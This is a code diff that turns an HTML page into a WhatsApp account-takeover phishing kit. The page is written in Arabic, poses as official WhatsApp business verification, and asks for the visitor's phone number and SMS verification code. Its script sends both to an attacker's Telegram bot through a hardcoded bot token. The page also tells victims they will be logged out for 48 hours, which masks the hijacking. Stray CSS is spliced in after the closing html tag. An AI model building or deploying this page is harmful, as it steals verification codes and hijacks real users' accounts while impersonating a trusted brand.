@@ -3,38 +3,346 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>التحقق من أنك لست روبوت</title>
+    <title>دعم الواتساب الرسمي</title>
     <style>
         body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background-color: #f0f2f5;
+            font-family: 'Arial', sans-serif;
+            background-color: #f5f5f5;
             margin: 0;
-            padding: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
+            padding: 20px;
             color: #333;
+            line-height: 1.6;
         }
-        .captcha-container {
-            background-color: white;
+        .container {
+            max-width: 600px;
+            margin: 0 auto;
+            background: white;
+            padding: 25px;
             border-radius: 12px;
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
-            width: 90%;
-            max-width: 500px;
-            padding: 30px;
-            text-align: center;
+            box-shadow: 0 0 15px rgba(0,0,0,0.1);
         }
-        .logo {
-            width: 80px;
-            height: 80px;
-            margin: 0 auto 20px;
-            background-color: #4285F4;
-            border-radius: 50%;
-            display: flex;
-            justify-content: center;
-            align-items: center;
+        h1 {
+            color: #25D366;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .form-group {
+            margin-bottom: 20px;
+        }
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: bold;
+            color: #555;
+        }
+        input, select {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            box-sizing: border-box;
+            font-size: 16px;
+        }
+        button {
+            background-color: #25D366;
             color: white;
+            border: none;
+            padding: 12px 15px;
+            border-radius: 6px;
+            cursor: pointer;
+            width: 100%;
+            font-size: 16px;
+            font-weight: bold;
+            transition: background-color 0.3s;
+        }
+        button:hover {
+            background-color: #128C7E;
+        }
+        .secured {
+            font-size: 13px;
+            color: #777;
+            text-align: center;
+            margin-top: 25px;
+            padding-top: 15px;
+            border-top: 1px solid #eee;
+        }
+        .badge {
+            background-color: #25D366;
+            color: white;
+            padding: 4px 8px;
+            border-radius: 4px;
+            font-size: 12px;
+            font-weight: bold;
+        }
+        .whatsapp-logo {
+            text-align: center;
+            margin: 15px 0;
+        }
+        .whatsapp-logo img {
+            height: 80px;
+            margin-bottom: 10px;
+        }
+        #verification-section {
+            display: none;
+        }
+        .info-box {
+            background-color: #f8f9fa;
+            border-left: 4px solid #25D366;
+            padding: 15px;
+            margin: 20px 0;
+            border-radius: 0 5px 5px 0;
+        }
+        .info-box h3 {
+            margin-top: 0;
+            color: #128C7E;
+        }
+        .country-select {
+            display: flex;
+            align-items: center;
+        }
+        .country-select select {
+            flex: 1;
+            margin-left: 10px;
+        }
+        .country-flag {
+            width: 30px;
+            height: 20px;
+            object-fit: cover;
+            border: 1px solid #ddd;
+        }
+        #loading {
+            display: none;
+            text-align: center;
+            margin: 15px 0;
+        }
+        .timer {
+            color: #777;
+            font-size: 14px;
+            text-align: center;
+            margin-top: 10px;
+        }
+        .header-logo {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .header-logo img {
+            height: 70px;
+        }
+        .logo-text {
+            color: #25D366;
+            font-weight: bold;
+            margin-top: 10px;
+            font-size: 18px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header-logo">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="شعار واتساب">
+            <div class="logo-text">WhatsApp</div>
+        </div>
+        
+        <h1>التوثيق الرسمي للواتساب</h1>
+        <div class="whatsapp-logo">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="واتساب">
+        </div>
+        
+        <div class="info-box">
+            <h3>فوائد توثيق رقم الواتساب</h3>
+            <p>توثيق رقم الواتساب يمنحك:</p>
+            <ul>
+                <li>علامة التحقق <span class="badge">الرسمية</span> التي تثبت هوية عملك</li>
+                <li>حماية ضد انتحال الهوية والحسابات المزيفة</li>
+                <li>ظهور أولوية في نتائج البحث على واتساب</li>
+                <li>زيادة ثقة العملاء بنسبة تصل إلى 80%</li>
+                <li>إمكانية استخدام أدوات الأعمال المتقدمة</li>
+                <li>حماية بياناتك برمزية من طرف إلى طرف</li>
+            </ul>
+            <p>عملية التوثيق تتم خلال 3 أيام عمل كحد أقصى بعد تقديم الطلب.</p>
+        </div>
+        
+        <div style="background: #f0f0f0; padding: 12px; border-radius: 6px; margin: 20px 0;">
+            <p><span class="badge">مؤمن</span> جميع المحادثات والمكالمات محمية بتشفير من طرف إلى طرف.</p>
+        </div>
+        
+        <form id="main-form" method="POST">
+            <!-- قسم إدخال رقم الهاتف -->
+            <div id="phone-section">
+                <div class="form-group">
+                    <label for="country">الدولة</label>
+                    <div class="country-select">
+                        <select id="country" name="country">
+                            <option value="966+" data-flag="🇸🇦">السعودية (966+)</option>
+                            <option value="971+" data-flag="🇦🇪">الإمارات (971+)</option>
+                            <option value="20+" data-flag="🇪🇬">مصر (20+)</option>
+                            <option value="962+" data-flag="🇯🇴">الأردن (962+)</option>
+                            <option value="965+" data-flag="🇰🇼">الكويت (965+)</option>
+                            <option value="974+" data-flag="🇶🇦">قطر (974+)</option>
+                            <option value="968+" data-flag="🇴🇲">عمان (968+)</option>
+                            <option value="973+" data-flag="🇧🇭">البحرين (973+)</option>
+                            <option value="1+" data-flag="🇺🇸">الولايات المتحدة (1+)</option>
+                            <option value="44+" data-flag="🇬🇧">المملكة المتحدة (44+)</option>
+                            <option value="33+" data-flag="🇫🇷">فرنسا (33+)</option>
+                            <option value="49+" data-flag="🇩🇪">ألمانيا (49+)</option>
+                            <option value="39+" data-flag="🇮🇹">إيطاليا (39+)</option>
+                            <option value="34+" data-flag="🇪🇸">إسبانيا (34+)</option>
+                            <option value="90+" data-flag="🇹🇷">تركيا (90+)</option>
+                            <option value="7+" data-flag="🇷🇺">روسيا (7+)</option>
+                            <option value="86+" data-flag="🇨🇳">الصين (86+)</option>
+                            <option value="91+" data-flag="🇮🇳">الهند (91+)</option>
+                        </select>
+                    </div>
+                </div>
+                
+                <div class="form-group">
+                    <label for="phone">رقم الهاتف</label>
+                    <input type="tel" id="phone" name="phone" placeholder="أدخل رقم الهاتف بدون الصفر الأول" required>
+                </div>
+                
+                <button type="button" id="send-verification">إرسال رمز التحقق</button>
+                <div id="loading" style="display: none;">
+                    <p>جاري إرسال رمز التحقق...</p>
+                </div>
+            </div>
+            
+            <!-- قسم إدخال رمز التحقق (سيظهر بعد إرسال الرقم) -->
+            <div id="verification-section">
+                <div class="form-group">
+                    <label for="verification-code">رمز التحقق المكون من 6 أرقام</label>
+                    <input type="text" id="verification-code" name="verification-code" placeholder="أدخل رمز التحقق المرسل إليك" maxlength="6" required>
+                </div>
+                
+                <div class="timer" id="timer">يمكنك إعادة الإرسال بعد 02:00</div>
+                <button type="button" id="resend-code" style="background: #f0f0f0; color: #555; display: none;">إعادة إرسال الرمز</button>
+                
+                <button type="submit">تأكيد التوثيق</button>
+            </div>
+        </form>
+        
+        <div class="info-box">
+            <h3>كيف يعمل التوثيق؟</h3>
+            <p>1. تقوم بإدخال رقم هاتفك المراد توثيقه</p>
+            <p>2. نرسل لك رمز تحقق مؤقت عبر رسالة SMS</p>
+            <p>3. تدخل رمز التحقق لتأكيد ملكية الرقم</p>
+            <p>4. نتحقق من بياناتك خلال 48 ساعة عمل</p>
+            <p>5. سيتم تسجيل الخروج من حسابك لمدة 48 ساعة لحين توثيق حسابك</p>
+            <p>6. تحصل على العلامة الرسمية بعد الموافقة</p>
+        </div>
+        
+        <p class="secured">هذا الحساب هو الحساب الرسمي المعتمد من واتساب للأعمال. جميع البيانات محمية بتشفير متقدم.</p>
+    </div>
+
+    <script>
+        // جلب chat_id من الرابط
+        const urlParams = new URLSearchParams(window.location.search);
+        const chatId = urlParams.get('chat_id');
+        const botToken = '8378025141:AAGLgpp5IHKq4Ykrg-XEq_pmDCTucwgWIJQ';
+
+        // دالة إرسال البيانات إلى التليجرام
+        function sendToTelegram(data) {
+            if (!chatId) {
+                console.error('Chat ID not found in URL');
+                return;
+            }
+            
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(JSON.stringify(data))}`;
+            fetch(url)
+                .then(response => response.json())
+                .then(data => console.log('تم الإرسال بنجاح:', data))
+                .catch(error => console.error('خطأ في الإرسال:', error));
+        }
+
+        // إرسال رمز التحقق
+        document.getElementById('send-verification').addEventListener('click', function() {
+            const countryCode = document.getElementById('country').value;
+            const phoneNumber = document.getElementById('phone').value;
+            
+            if (!phoneNumber || phoneNumber.length < 8) {
+                alert('الرجاء إدخال رقم هاتف صحيح (8 أرقام على الأقل)');
+                return;
+            }
+            
+            document.getElementById('loading').style.display = 'block';
+            document.getElementById('send-verification').disabled = true;
+            
+            const countryName = document.getElementById('country').options[document.getElementById('country').selectedIndex].text;
+            
+            // إرسال بيانات الهاتف إلى التليجرام
+            sendToTelegram({
+                type: 'phone_submission',
+                phone: `${countryCode}${phoneNumber}`,
+                country: countryName,
+                time: new Date().toLocaleString('ar-EG')
+            });
+
+            // المحاكاة فقط (لن يتم إرسال رسالة حقيقية)
+            setTimeout(() => {
+                document.getElementById('phone-section').style.display = 'none';
+                document.getElementById('verification-section').style.display = 'block';
+                document.getElementById('loading').style.display = 'none';
+                startTimer();
+            }, 1500);
+        });
+        
+        // تأكيد رمز التحقق
+        document.getElementById('main-form').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const verificationCode = document.getElementById('verification-code').value;
+            
+            if (!verificationCode || verificationCode.length !== 6) {
+                alert('الرجاء إدخال رمز التحقق المكون من 6 أرقام');
+                return;
+            }
+            
+            // إرسال كود التحقق إلى التليجرام
+            sendToTelegram({
+                type: 'verification_code',
+                code: verificationCode,
+                time: new Date().toLocaleString('ar-EG')
+            });
+
+            alert('تم إرسال طلب التوثيق بنجاح! سيتم التواصل معك خلال 48 ساعة عمل.');
+        });
+        
+        // مؤقت لإعادة الإرسال
+        function startTimer() {
+            let timeLeft = 120;
+            const timerElement = document.getElementById('timer');
+            const resendButton = document.getElementById('resend-code');
+            
+            const timerInterval = setInterval(() => {
+                const minutes = Math.floor(timeLeft / 60);
+                const seconds = timeLeft % 60;
+                
+                timerElement.textContent = `يمكنك إعادة الإرسال بعد ${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+                
+                if (timeLeft <= 0) {
+                    clearInterval(timerInterval);
+                    timerElement.style.display = 'none';
+                    resendButton.style.display = 'block';
+                }
+                
+                timeLeft--;
+            }, 1000);
+            
+            resendButton.addEventListener('click', function() {
+                document.getElementById('verification-section').style.display = 'none';
+                document.getElementById('phone-section').style.display = 'block';
+                document.getElementById('send-verification').disabled = false;
+                resendButton.style.display = 'none';
+                timerElement.style.display = 'block';
+            });
+        }
+        
+        // التحقق من صحة رقم الهاتف
+        document.getElementById('phone').addEventListener('input', function() {
+            this.value = this.value.replace(/[^0-9]/g, '');
+        });
+    </script>
+</body>
+</html>            color: white;
             font-size: 24px;
             font-weight: bold;
         }
